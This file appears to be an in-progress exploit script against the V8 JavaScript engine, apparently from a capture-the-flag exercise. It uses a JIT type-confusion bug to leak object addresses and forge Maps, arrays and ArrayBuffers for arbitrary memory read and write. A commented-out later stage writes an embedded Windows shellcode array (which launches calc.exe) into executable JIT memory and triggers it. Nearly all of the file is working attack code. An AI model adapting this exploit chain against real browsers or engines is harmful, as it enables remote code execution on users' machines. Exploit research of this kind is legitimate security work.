// dstub("var the fun begin: ");

var shellcode = [72, 131, 236, 40, 72, 131, 228, 240, 72, 199, 194, 96, 0, 0, 0, 101, 76, 139, 34, 77, 139, 100, 36, 24, 77, 139, 100, 36, 32, 77, 139, 36, 36, 77, 139, 36, 36, 77, 139, 100, 36, 32, 72, 186, 142, 78, 14, 236, 0, 0, 0, 0, 73, 139, 204, 232, 102, 0, 0, 0, 235, 56, 89, 255, 208, 72, 199, 194, 152, 254, 138, 14, 73, 139, 204, 232, 82, 0, 0, 0, 72, 139, 216, 77, 51, 201, 235, 60, 65, 88, 235, 42, 90, 72, 139, 202, 255, 211, 72, 199, 194, 197, 181, 73, 17, 73, 139, 204, 232, 49, 0, 0, 0, 72, 51, 201, 255, 208, 232, 195, 255, 255, 255, 117, 115, 101, 114, 51, 50, 46, 100, 108, 108, 0, 232, 209, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 232, 191, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 76, 139, 233, 65, 139, 69, 60, 77, 139, 221, 76, 3, 232, 69, 139, 181, 136, 0, 0, 0, 77, 3, 243, 69, 139, 86, 24, 65, 139, 94, 32, 73, 3, 219, 103, 227, 60, 73, 255, 202, 66, 139, 52, 147, 73, 3, 243, 72, 51, 255, 72, 51, 192, 252, 172, 132, 192, 116, 7, 193, 207, 13, 3, 248, 235, 244, 59, 250, 117, 220, 65, 139, 94, 36, 73, 3, 219, 51, 201, 102, 66, 139, 12, 83, 65, 139, 94, 28, 73, 3, 219, 139, 4, 139, 73, 3, 195, 195];

function dstub(msg){
    console.log(msg);
    readline();
}

function scavenge() {
    for (let i = 0; i < (1024 * 1024) / 16; i++) {
        let a = new String('Theori');
    }
}

function getme(){
    return 1+1;
}

// Let the fun begin!

function opt_Read(a, b, leak) {
    b[1];
    a.length;
    for (var i = 0; i < 1; i++)
        a[1] = leak; // leak is an object
    // a is Packed_element array, b's direct write in will result in 
    // CheckMap removed, type confusion
    // converts into double??
    // readline();
    return b[1];
}

function opt_Read2(a, b, leak) {
    b[1];
    a.length;
    for (var i = 0; i < 1; i++)
        a[1] = leak; 
    return b[1];
}

function opt_Read3(a, b, leak) {
    b[1];
    a.length;
    for (var i = 0; i < 1; i++)
        a[1] = leak; 
    return b[1];
}

function opt_Read4(a, b, leak) {
    b[1];
    a.length;
    for (var i = 0; i < 1; i++)
        a[1] = leak; 
    return b[1];
}

function opt_Read5(a, b, leak) {
    b[1];
    a.length;
    for (var i = 0; i < 1; i++)
        a[1] = leak; 
    return b[1]; 
}

// [*] Type Confusion for Read.

// let temp = new ArrayBuffer(0x100);
// %DebugPrint(temp);


var dba = new Array(0x100);
dba.fill(0.1);
%DebugPrint(dba);
// %DebugPrint(target);

// Our exploit way could be : 
// faking a ArrayBuffer to bypass check to get Arbitrary RW primitive. 
// if we want to fake ArrayBuffer, we need to fake ArrayBuffer->Map to a known addr. 
// thus we need to leak ArrayBuffer's map's important prototype pointer. 

/* leak DoubleArray.__proto__ */
var arr1 = [{}, 1.1];
opt_Read(arr1, [0], 1.1);
var arr2 = [0.1];
opt_Read(arr2, arr2, 1.1);
%OptimizeFunctionOnNextCall(opt_Read);
var dba_proto_addr = opt_Read(arr2, arr2, dba.__proto__);
print("[*] Got doubleArray's prototype addr: " + dba_proto_addr); // X should be ArrayBuffer's proto address, leak accomplished.
// %DebugPrint(aba);
dstub("Now try to leak fake_map addr ");

/* fake and leak fake_map */ 
var fake_dba_map = [ 
    -1.1263976280432204e+129, // place taken 
    6.954192172582307e-308, // place taken 
    7.4602426e-316, // place taken 
    dba_proto_addr,
    dba_proto_addr,
    dba_proto_addr,
    dba_proto_addr
];  
%DebugPrint(fake_dba_map);

// leak fake_dba_map addr.

var arr3 = [{}, 1.1];
opt_Read2(arr3, [0], 1.1);
var arr3 = [fake_dba_map, 1.1];
opt_Read2(arr3, [0], 1.1);
var arr4 = [0.1];
opt_Read2(arr4, arr4, 1.1);
%OptimizeFunctionOnNextCall(opt_Read);
var fake_dba_map_addr = opt_Read(arr4, arr4, fake_dba_map) + 3.16e-322;
print("[*] Got faked aba map addr: " + fake_dba_map_addr);
dstub("fake dba map leaked. ");

// fake doubleArray with a large length and append with a ArrayBuffer.
/* fake and leak doubleArray */
var fake_dba = [
    fake_dba_map_addr, // fake Map
    fake_dba_map_addr,
    fake_dba_map_addr,
    2.1729236899484e-311, // 0x40000000000 size 
    2.1729236899484e-311,
    2.1729236899484e-311,
    2.1729236899484e-311,
    2.1729236899484e-311
];

var target_aba = new ArrayBuffer(0x100);

print("layout: ");
%DebugPrint(fake_dba);
%DebugPrint(target_aba);

// %DebugPrint(target_ara);

// now, try to leak fake_aba, and return it as a normal JSArray Obj.
// leak the fake ArrayBuffer
var arr7 = [{}, 1.1];
opt_Read4(arr7, [0], 1.1);
var arr8 = [0.1];
opt_Read4(arr8, arr8, 1.1);
%OptimizeFunctionOnNextCall(opt_Read4);
var fake_dba_addr = opt_Read4(arr8, arr8, fake_dba) + 3.16e-322; // 0x40
print("[*] Got faked aba addr: " + fake_dba_addr);
dstub("faked DoubleArray leaked. ");

// now put it into our engine and extract it as a real obj.

function opt_Write(a, b) {
    b[0] = 0;

    a.length;

    // TransitionElementsKind
    for (var i = 0; i < 1; i++)
        a[0] = 0;

    // CheckMap removed, type confusion
    b[0] = fake_dba_addr;  // 0x1234567
}

// trigger opt_Write JIT optimization to type confusion

var arr9 = new Array(1);
arr9[0] = 'a'; // PACKED
opt_Write(arr9, [0]);
var arr10 = [0.1];
opt_Write(arr10, arr10);
%OptimizeFunctionOnNextCall(opt_Write);
opt_Write(arr10, arr10);
// extract a val
%DebugPrint(arr10);

print("val to write: " + fake_dba_addr);
print(arr10[0][0]);
print(arr10[0][1]);
print(arr10[0][2]);
print(arr10[0][3]);
dstub("tbc");

// %DebugPrint(fake_map);
// fake_map shall be enough for landing as ArrayBuffer's map.
// now we just need to leak fake_map, and fill it as map to faked ArrayBuffer.
// leak again!
// var arr3 = [fake_map, 1.1];
// opt_Read2(arr3, [0], 1.1);
// var arr3 = [fake_map, 1.1];
// opt_Read2(arr3, [0], 1.1);
// var arr4 = [0.1];
// opt_Read2(arr4, arr4, 1.1);
// %OptimizeFunctionOnNextCall(opt_Read);
// var fake_map_addr = opt_Read(arr4, arr4, fake_map) + 3.16e-322;
// print("[*] Got faked aba map addr: " + fake_map_addr);
// dstub("fake map leaked. ");

// /* leak js function */
// var arr5 = [{}, 1.1];
// opt_Read3(arr5, [0], 1.1);
// var arr6 = [0.1];
// opt_Read3(arr6, arr6, 1.1);
// // %OptimizeFunctionOnNextCall(opt_Read3);
// var jsfunc_addr = opt_Read(arr6, arr6, getme);
// print("[*] Got JSFunction addr: " + jsfunc_addr);
// dstub("jsfunc_addr leaked ");

// /* fake and leak ArrayBuffer */
// // **Create fake ArrayBuffer**
// var fake_aba = [
//     fake_map_addr, // fake Map
//     fake_map_addr,
//     fake_map_addr,
//     3.4766779039175e-310, // 0x400000000000 size 
//     jsfunc_addr-5e-324, // backing store 
//     2e-323, // 0x4 
//     2e-323
// ]

// // leak the fake ArrayBuffer
// var arr7 = [{}, 1.1];
// opt_Read4(arr5, [0], 1.1);
// var arr8 = [0.1];
// opt_Read4(arr8, arr8, 1.1);
// %OptimizeFunctionOnNextCall(opt_Read4);
// var fake_aba_addr = opt_Read4(arr8, arr8, fake_aba);
// print("[*] Got faked aba addr: " + fake_aba_addr);
// dstub("faked ArrayBuffer leaked. ");

// /* write faked obj into confusioned buffer to make it come into effect! */
// var X = fake_aba_addr + 3.16e-322; // 0x40

// function opt_Write(a, b) {
//     b[0] = 0;

//     a.length;

//     // TransitionElementsKind
//     for (var i = 0; i < 1; i++)
//         a[0] = 0;

//     // CheckMap removed, type confusion
//     b[0] = X;  // 0x1234567
// }

// // trigger opt_Write JIT optimization to type confusion

// var arr9 = new Array(1);
// arr9[0] = 'a'; // PACKED
// opt_Write(arr9, [0]);
// var arr10 = [0.1];
// opt_Write(arr10, arr10);
// %OptimizeFunctionOnNextCall(opt_Write);
// opt_Write(arr10, arr10);
// // arr10[0] should be a ArrayBuffer now. 
// // Try to create DataView Directly. 
// // %DebugPrint(arr10); 

// // If this won't fail, then everything is just good! 
// var dvobj = new DataView(arr10[0], 0x30, 8, true); 
// let rwx_code = dvobj.getFloat64(0, true);
// print(rwx_code);
// dstub("rwx region leaked!");

// // now repeat and fake again!

// // fake for backing store direct pointing to rwx.
// var fake_aba2 = [
//     fake_map_addr, // fake Map
//     fake_map_addr,
//     fake_map_addr,
//     3.4766779039175e-310, // 0x400000000000 size 
//     rwx_code + 4.7e-322, // backing store rwx_header+1+0x5f (+0x60) 
//     2e-323, // 0x4 
//     2e-323
// ]

// // leak faked ArrayBuffer2, whose backing store pointing at rwx_code + 0x60.

// var arr11 = [{}, 1.1];
// opt_Read5(arr11, [0], 1.1);
// var arr12 = [0.1];
// opt_Read5(arr12, arr12, 1.1);
// %OptimizeFunctionOnNextCall(opt_Read5);
// var fake_aba2_addr = opt_Read5(arr12, arr12, fake_aba2) + 3.16e-322;
// print("[*] Got faked aba map addr: " + fake_aba2_addr);
// dstub("fake aba2 addr leaked. ");

// // trigger another write in to get this ArrayBuffer into effect.

// function opt_Write2(a, b) {
//     b[0] = 0;

//     a.length;

//     // TransitionElementsKind
//     for (var i = 0; i < 1; i++)
//         a[0] = 0;

//     // CheckMap removed, type confusion
//     b[0] = fake_aba2_addr;  // 0x1234567
// }


// var arr13 = new Array(1);
// arr13[0] = 'a'; // PACKED
// opt_Write2(arr13, [0]);
// var arr14 = [0.1];
// opt_Write2(arr14, arr14);
// %OptimizeFunctionOnNextCall(opt_Write2);
// opt_Write2(arr14, arr14);
// dstub("fake success");

// var dvobj2 = new DataView(arr14[0]);
// for(let i = 0 ; i < shellcode.length; i++){
//     dvobj2.setInt8(i, shellcode[i]);
// }

// // trigger

// getme();